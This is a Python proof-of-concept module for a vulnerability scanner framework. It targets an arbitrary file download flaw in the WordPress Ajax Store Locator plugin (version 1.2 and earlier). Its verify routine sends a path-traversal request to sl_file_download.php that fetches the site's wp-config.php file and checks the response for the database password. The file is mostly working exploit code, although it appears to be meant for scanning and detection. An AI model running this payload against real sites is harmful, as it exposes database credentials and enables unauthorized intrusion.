# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    poc_id = 'a3a0ae67-bd5e-4272-98c5-15118746f436'
    name = 'WordPress Ajax Store Locator <= 1.2 /sl_file_download.php 任意文件下载漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-12-08'  # 漏洞公布时间
    desc = '''
        download_file" variable is not sanitized.
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/35493'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Ajax Store Locator <= 1.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a8991fdf-5806-4b46-9bc4-ac3a947c01af'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = ('/wp-content/plugins/codecanyon-5293356-ajax-store-locator-word'
                       'press/sl_file_download.php?download_file=../../../wp-config.php')
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if 'DB_PASSWORD' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
